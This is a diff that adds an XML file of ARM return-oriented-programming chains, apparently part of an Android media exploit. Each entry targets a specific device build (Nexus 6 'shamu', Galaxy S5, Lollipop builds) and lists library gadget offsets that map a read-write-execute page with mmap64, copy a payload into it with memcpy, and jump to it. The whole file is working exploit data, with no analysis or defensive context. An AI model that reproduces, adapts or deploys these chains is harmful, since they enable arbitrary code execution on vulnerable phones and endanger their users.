@@ -1,0 +1,225 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+	<compatibility>
+		<target>lrx</target>
+	</compatibility>
+
+	<gadgets base="0xb66a0000">
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget offset="0x000042f9">pop {r0, r1, r2, r3, r4, r7, pc}</gadget>
+		<gadget value="0x00000000">mmap64 addres hint (none)</gadget>
+		<gadget value="0x00001000">mmap64 length (1 page)</gadget>
+		<gadget value="0x00000007">mmap64 protection (PROT_READ|PROT_WRITE|PROT_EXEC)</gadget>
+		<gadget value="0x00000022">mmap64 flags (MAP_PRIVATE|MAP_ANONYMOUS)</gadget>
+		<gadget offset="0x001127b8">ptr to mmap64 (less 0x20)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0008b7d9">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="0xffffffff">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x00058e63">pop {r4, pc}</gadget>
+		<gadget offset="0x00110438">ptr to memcpy (less 0x20)</gadget>
+		<gadget offset="0x00061597">pop {r1, r2, r7, pc}</gadget>
+		<gadget value="0xc600613c">memcpy src (address of payload)</gadget>
+		<gadget value="size">memcpy length (payload size)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0008b7d9">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget value="junk">value to be skipped (r5)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0002fed3">bx r0</gadget>
+	</gadgets>
+</rop>
+
+<rop>
+	<compatibility>
+		<target>lmy-1</target>
+	</compatibility>
+
+	<gadgets base="0xb66a0000">
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget offset="0x000bfdbf">pop {r0, r1, r2, r3, r4, r7, pc}</gadget>
+		<gadget value="0x00000000">mmap64 addres hint (none)</gadget>
+		<gadget value="0x00001000">mmap64 length (1 page)</gadget>
+		<gadget value="0x00000007">mmap64 protection (PROT_READ|PROT_WRITE|PROT_EXEC)</gadget>
+		<gadget value="0x00000022">mmap64 flags (MAP_PRIVATE|MAP_ANONYMOUS)</gadget>
+		<gadget offset="0x001137b4">ptr to mmap64 (less 0x20)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0008c269">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="0xffffffff">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0000f379">pop {r4, pc}</gadget>
+		<gadget offset="0x00111430">ptr to memcpy (less 0x20)</gadget>
+		<gadget offset="0x000a1251">pop {r1, r2, r7, pc}</gadget>
+		<gadget value="0xc600613c">memcpy src (address of payload)</gadget>
+		<gadget value="size">memcpy length (payload size)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0008c269">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget value="junk">value to be skipped (r5)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x000301a5">bx r0</gadget>
+	</gadgets>
+</rop>
+
+<rop>
+	<compatibility>
+		<target>lmy-2</target>
+	</compatibility>
+
+	<gadgets base="0xb66a0000">
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget offset="0x000bfe07">pop {r0, r1, r2, r3, r4, r7, pc}</gadget>
+		<gadget value="0x00000000">mmap64 addres hint (none)</gadget>
+		<gadget value="0x00001000">mmap64 length (1 page)</gadget>
+		<gadget value="0x00000007">mmap64 protection (PROT_READ|PROT_WRITE|PROT_EXEC)</gadget>
+		<gadget value="0x00000022">mmap64 flags (MAP_PRIVATE|MAP_ANONYMOUS)</gadget>
+		<gadget offset="0x001137b4">ptr to mmap64 (less 0x20)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0008c231">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="0xffffffff">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0000f379">pop {r4, pc}</gadget>
+		<gadget offset="0x00111430">ptr to memcpy (less 0x20)</gadget>
+		<gadget offset="0x000042e9">pop {r1, r2, r6, pc}</gadget>
+		<gadget value="0xc600613c">memcpy src (address of payload)</gadget>
+		<gadget value="size">memcpy length (payload size)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget offset="0x0008c231">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget value="junk">value to be skipped (r5)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0000b3bd">bx r0</gadget>
+	</gadgets>
+</rop>
+
+<rop>
+	<compatibility>
+		<target>shamu / LYZ28E</target>
+	</compatibility>
+
+	<gadgets base="0xb66a0000">
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget offset="0x000bfe4f">pop {r0, r1, r2, r3, r4, r7, pc}</gadget>
+		<gadget value="0x00000000">mmap64 addres hint (none)</gadget>
+		<gadget value="0x00001000">mmap64 length (1 page)</gadget>
+		<gadget value="0x00000007">mmap64 protection (PROT_READ|PROT_WRITE|PROT_EXEC)</gadget>
+		<gadget value="0x00000022">mmap64 flags (MAP_PRIVATE|MAP_ANONYMOUS)</gadget>
+		<gadget offset="0x0011e7b0">ptr to mmap64 (less 0x20)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0008c279">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="0xffffffff">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x00044f71">pop {r4, pc}</gadget>
+		<gadget offset="0x0011c42c">ptr to memcpy (less 0x20)</gadget>
+		<gadget offset="0x000042e9">pop {r1, r2, r6, pc}</gadget>
+		<gadget value="0xc600613c">memcpy src (address of payload)</gadget>
+		<gadget value="size">memcpy length (payload size)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget offset="0x0008c279">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget value="junk">value to be skipped (r5)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0000f7cd">bx r0</gadget>
+	</gadgets>
+</rop>
+
+<rop>
+	<compatibility>
+		<target>shamu / LYZ28J</target>
+	</compatibility>
+
+	<gadgets base="0xb66a0000">
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget offset="0x000bfe07">pop {r0, r1, r2, r3, r4, r7, pc}</gadget>
+		<gadget value="0x00000000">mmap64 addres hint (none)</gadget>
+		<gadget value="0x00001000">mmap64 length (1 page)</gadget>
+		<gadget value="0x00000007">mmap64 protection (PROT_READ|PROT_WRITE|PROT_EXEC)</gadget>
+		<gadget value="0x00000022">mmap64 flags (MAP_PRIVATE|MAP_ANONYMOUS)</gadget>
+		<gadget offset="0x0011e7b0">ptr to mmap64 (less 0x20)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0008c231">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="0xffffffff">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x00044f71">pop {r4, pc}</gadget>
+		<gadget offset="0x0011c42c">ptr to memcpy (less 0x20)</gadget>
+		<gadget offset="0x000042e9">pop {r1, r2, r6, pc}</gadget>
+		<gadget value="0xc600613c">memcpy src (address of payload)</gadget>
+		<gadget value="size">memcpy length (payload size)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget offset="0x0008c231">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget value="junk">value to be skipped (r5)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0000f83d">bx r0</gadget>
+	</gadgets>
+</rop>
+
+<rop>
+	<compatibility>
+		<target>sm-g900v / OE1</target>
+	</compatibility>
+
+	<gadgets base="0xb66a0000">
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget offset="0x00092b85">pop {r0, r1, r2, r3, r4, r7, pc}</gadget>
+		<gadget value="0x00000000">mmap64 addres hint (none)</gadget>
+		<gadget value="0x00001000">mmap64 length (1 page)</gadget>
+		<gadget value="0x00000007">mmap64 protection (PROT_READ|PROT_WRITE|PROT_EXEC)</gadget>
+		<gadget value="0x00000022">mmap64 flags (MAP_PRIVATE|MAP_ANONYMOUS)</gadget>
+		<gadget offset="0x0017af08">ptr to mmap64 (less 0x20)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x000a7a41">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="0xffffffff">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 fd</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="0x00000000">mmap64 offset (64-bit)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x00065467">pop {r4, pc}</gadget>
+		<gadget offset="0x0017a6e4">ptr to memcpy (less 0x20)</gadget>
+		<gadget offset="0x0009f359">pop {r1, r2, r7, pc}</gadget>
+		<gadget value="0xc600613c">memcpy src (address of payload)</gadget>
+		<gadget value="size">memcpy length (payload size)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x000a7a41">ldr r4, [r4, #0x20] ; blx r4 ; pop {r3, r4, r5, r6, r7, pc}</gadget>
+		<gadget value="junk">value to be skipped (r3)</gadget>
+		<gadget value="junk">value to be skipped (r4)</gadget>
+		<gadget value="junk">value to be skipped (r5)</gadget>
+		<gadget value="junk">value to be skipped (r6)</gadget>
+		<gadget value="junk">value to be skipped (r7)</gadget>
+		<gadget offset="0x0000c409">bx r0</gadget>
+	</gadgets>
+</rop>
+
+</db>
